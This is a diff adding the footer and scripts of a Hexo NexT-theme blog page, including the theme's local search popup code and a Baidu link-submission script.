+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      
+    </span>
+  
+</div>
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+  
+  <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.1"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.1"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.1"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.1"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (search_path.endsWith("json")) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('10');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+
+  
+
+  
+
+  
+
+</body>
+</html>
